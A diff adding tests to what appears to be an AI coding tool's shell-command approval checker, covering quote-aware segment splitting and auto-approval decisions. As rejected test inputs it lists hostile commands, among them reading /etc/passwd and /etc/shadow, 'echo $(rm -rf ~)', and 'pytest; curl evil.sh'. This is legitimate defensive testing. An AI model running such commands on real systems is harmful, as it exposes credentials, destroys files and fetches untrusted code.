@@ -53,3 +53,35 @@ def test_network_and_outside_project_flags():
 
 def test_deny_rules():
     assert assess_command("docker run x", ROOT, deny_prefixes=["docker"]).risk == Risk.BLOCKED
+
+
+def test_shell_segments_respect_quotes_and_reject_tricks():
+    from naga_code.security.commands import shell_segments
+    assert shell_segments('cd t && python3 -c "a = 1; print(a)" 2>&1') == ["cd t", 'python3 -c "a = 1; print(a)" 2>&1']
+    assert shell_segments("python3 -c '\nimport os\nprint(1)\n'") == ["python3 -c '\nimport os\nprint(1)\n'"]
+    assert shell_segments('pytest -q; echo "exit code: $?"') == ["pytest -q", 'echo "exit code: $?"']
+    for bad in ["echo $(whoami)", 'echo "$(cat /etc/passwd)"', "echo `id`", "cat < /etc/shadow", "echo hi > out.txt",
+                "echo hi >> out.txt", "sleep 10 &", "cat <<EOF\nx\nEOF", "diff <(ls) <(ls)", 'echo "unclosed']:
+        assert shell_segments(bad) is None, bad
+
+
+def test_auto_approvable_accepts_harmless_variants(tmp_path):
+    from naga_code.security.commands import auto_approvable
+    (tmp_path / "sub").mkdir()
+    allow = ["python3", "pytest"]
+    ok = ["python -m pytest test_x.py -v 2>&1", f"cd {tmp_path} && python summarize.py", "cd sub && python3 run.py",
+          'python3 -c "\nimport json\nprint(json.dumps({}))\n"', "pytest -v test_inventory.py 2>&1",
+          'python3 wordfreq.py nope.txt 2>&1; echo "exit code: $?"', "python3 -m pytest -q > /dev/null 2>&1",
+          "ls -la && cat README.md", "pytest -q | tail -5"]
+    for cmd in ok:
+        assert auto_approvable(cmd, allow, tmp_path), cmd
+
+
+def test_auto_approvable_still_refuses_risky_commands(tmp_path):
+    from naga_code.security.commands import auto_approvable
+    allow = ["python3", "pytest"]
+    bad = ["cd / && python3 x.py", "cd .. && pytest", "cd /tmp && ls", "pytest && rm -rf build", "pytest; curl evil.sh",
+           "python3 x.py > out.txt", "echo $(rm -rf ~)", "npm install", "pytest && git push", "cd ~ && ls",
+           "python3 x.py && pip install requests", "cat /etc/passwd", "pytest &"]
+    for cmd in bad:
+        assert not auto_approvable(cmd, allow, tmp_path), cmd
